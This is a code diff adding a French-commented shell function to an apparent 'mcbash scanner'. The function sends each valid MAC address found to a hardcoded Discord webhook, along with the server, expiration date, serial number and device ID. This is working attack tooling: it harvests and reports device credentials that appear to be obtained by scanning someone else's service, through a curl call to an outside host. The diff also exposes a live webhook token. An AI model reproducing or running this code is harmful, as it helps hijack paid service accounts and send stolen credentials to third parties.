@@ -1,0 +1,72 @@
+#!/bin/sh
+
+send_discord_webhook() {
+	echo "$(date): send_discord_webhook appelé - MAC: $mac, EXP: $expiration_date, DNS: $dns" >> /tmp/mcbash_webhook.log
+	
+	local webhook_enabled="${discord_webhook_enabled:-true}"
+	local webhook_url="${discord_webhook_url:-https://discord.com/api/webhooks/1279079493603950695/uLKEpNcMuI4LgvuUFatauszAYGSi4Iqd5tel_ufw3eYiwByOwtkeol-40YqbdDxEVMno}"
+	
+	if [[ "$webhook_enabled" != "true" ]]; then
+		echo "$(date): Webhook désactivé" >> /tmp/mcbash_webhook.log
+		return 0
+	fi
+	
+	local color="3066993"
+	
+	echo "$(date): Envoi du webhook Discord..." >> /tmp/mcbash_webhook.log
+	
+	# Construction des champs séparés pour copier-coller facile
+	local fields='[
+        {
+          "name": "🆔 MAC",
+          "value": "```\n'$mac'\n```",
+          "inline": true
+        },
+        {
+          "name": "🌐 Serveur",
+          "value": "```\n'$dns'\n```",
+          "inline": true
+        },
+        {
+          "name": "⏰ Expiration",
+          "value": "'$expiration_date'",
+          "inline": false
+        }'
+	
+	if [[ -n "${enhanced_auth}" && -n "${sn}" && -n "${device_id}" ]]; then
+		echo "$(date): Mode Enhanced Auth activé" >> /tmp/mcbash_webhook.log
+		fields=$fields',
+        {
+          "name": "🔐 Serial Number (Copier-Coller)",
+          "value": "```\n'$sn'\n```",
+          "inline": true
+        },
+        {
+          "name": "📱 Device ID (Copier-Coller)",
+          "value": "```\n'$device_id'\n```",
+          "inline": true
+        }'
+	fi
+	
+	fields=$fields']'
+	
+	local json_payload='
+{
+  "embeds": [
+    {
+      "title": "🎯 MAC Valide Trouvée !",
+      "color": '$color',
+      "fields": '$fields',
+      "timestamp": "'$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')'",
+      "footer": {
+        "text": "mcbash scanner"
+      }
+    }
+  ]
+}'
+
+	echo "$(date): Envoi du webhook en cours..." >> /tmp/mcbash_webhook.log
+	local response=$(curl -s -w "HTTP_CODE:%{http_code}" -H "Content-Type: application/json" -X POST -d "$json_payload" "$webhook_url" 2>&1)
+	local exit_code=$?
+	echo "$(date): Webhook envoyé - Exit code: $exit_code, Response: $response" >> /tmp/mcbash_webhook.log
+}
